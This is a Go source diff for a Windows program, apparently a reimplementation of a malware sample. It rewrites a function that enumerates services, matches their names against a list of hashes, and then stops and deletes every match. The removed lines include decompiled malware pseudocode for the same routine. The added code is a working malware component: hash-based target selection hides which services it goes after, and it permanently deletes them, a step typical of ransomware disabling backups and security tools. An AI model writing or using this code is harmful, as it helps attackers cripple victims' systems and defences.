@@ -1,12 +1,13 @@
 package main
 
 import (
-	"fmt"
 	"strings"
 	"syscall"
+	"time"
 	"unsafe"
 
 	"golang.org/x/sys/windows"
+	"golang.org/x/sys/windows/svc/mgr"
 )
 
 const TH32CS_SNAPPROCESS = 0x00000002
@@ -96,72 +97,57 @@ func newWindowsProcess(e *windows.ProcessEntry32) WindowsProcess {
 	}
 }
 
+// Terminate services
+//Requires Admin
 func killTargetServices(serviceHashList []uint32) (err error) {
+	SCManager, err := mgr.ConnectRemote("")
+	if err != nil {
+		return err
+	}
+
+	defer SCManager.Disconnect()
+
 	hashMap := make(map[uint32]bool, len(serviceHashList))
 	for _, hash := range serviceHashList {
 		hashMap[hash] = true
 	}
 
-	scManagerHandle, err := windows.OpenSCManager(nil, nil, 4)
+	serviceList, err := SCManager.ListServices()
 	if err != nil {
 		return err
 	}
-	defer windows.CloseHandle(scManagerHandle)
 
-	var bufSizeNeeded uint32 = 0
-	var servicesReturned uint32 = 0
-	err = windows.EnumServicesStatusEx(scManagerHandle, 0, windows.SERVICE_WIN32, windows.SERVICE_STATE_ALL, nil, 0, &bufSizeNeeded, &servicesReturned, nil, nil)
-
-	if err != windows.ERROR_MORE_DATA {
-		return err
-	}
-
-	var serviceStatusBuffer = make([]byte, bufSizeNeeded)
-	err = windows.EnumServicesStatusEx(scManagerHandle, 0, windows.SERVICE_WIN32, windows.SERVICE_STATE_ALL, (*byte)(&(serviceStatusBuffer[0])), bufSizeNeeded, &bufSizeNeeded, &servicesReturned, nil, nil)
-
-	var services []windows.ENUM_SERVICE_STATUS_PROCESS = *(*[]windows.ENUM_SERVICE_STATUS_PROCESS)(unsafe.Pointer(&serviceStatusBuffer))
-	var i uint32 = 0
-	// wideCharBuffer := make([]byte, 2)
-	// var wideChar uint16
-	for ; i < servicesReturned; i++ {
-
-		start := unsafe.Pointer(services[i].DisplayName)
-		size := unsafe.Sizeof(uint16(0))
-		var wideChar uint16
-		name := []uint16{}
-		tempIndex := 0
-		for {
-			wideChar = *(*uint16)(unsafe.Pointer(start))
-			if wideChar == 0 {
-				break
+	for _, serviceName := range serviceList {
+		serviceHash := bufferHashing([]byte(strings.ToLower(serviceName)))
+		if hashMap[serviceHash] {
+			// kill service
+			service, err := SCManager.OpenService(serviceName)
+			if err != nil {
+				continue
 			}
-			name = append(name, wideChar)
-			tempIndex++
-			start = unsafe.Pointer(uintptr(start) + size*uintptr(tempIndex))
-		}
-		//fmt.Println("name: ", windows.UTF16ToString(name))
-		fmt.Println("proc id:", services[i].ServiceStatusProcess.ProcessId)
-	}
+			stopped := false
+			_, err = service.Control(windows.SERVICE_CONTROL_STOP)
+			if err != nil {
+				continue
+			}
 
-	fmt.Println("bufSizeNeeded: ", bufSizeNeeded)
-	fmt.Println("servicesReturned: ", servicesReturned)
+			for {
+				service_status, err := service.Query()
+				if err != nil {
+					break
+				}
+				if uint32(service_status.State) == uint32(windows.SERVICE_STOPPED) {
+					stopped = true
+					break
+				}
+				time.Sleep(time.Millisecond * 500)
+			}
+			if stopped {
+				service.Delete()
+				service.Close()
+			}
+
+		}
+	}
 	return nil
 }
-
-// v5 = 0;
-// SC_Manager_handle = mw_OpenSCManagerW(0, 0, 4);
-// if ( SC_Manager_handle )
-// {
-//   service_handle = mw_OpenServiceW(SC_Manager_handle, service_name, 65568);
-//   if ( service_handle )
-//   {
-// 	mw_memset(v2, 0, 28);
-// 	mw_ControlService(service_handle, SERVICE_CONTROL_STOP, v2);
-// 	mw_DeleteService(service_handle);
-// 	mw_CloseServiceHandle(service_handle);
-// 	v5 = 1;
-//   }
-// }
-// if ( SC_Manager_handle )
-//   mw_CloseServiceHandle(SC_Manager_handle);
-// return v5;
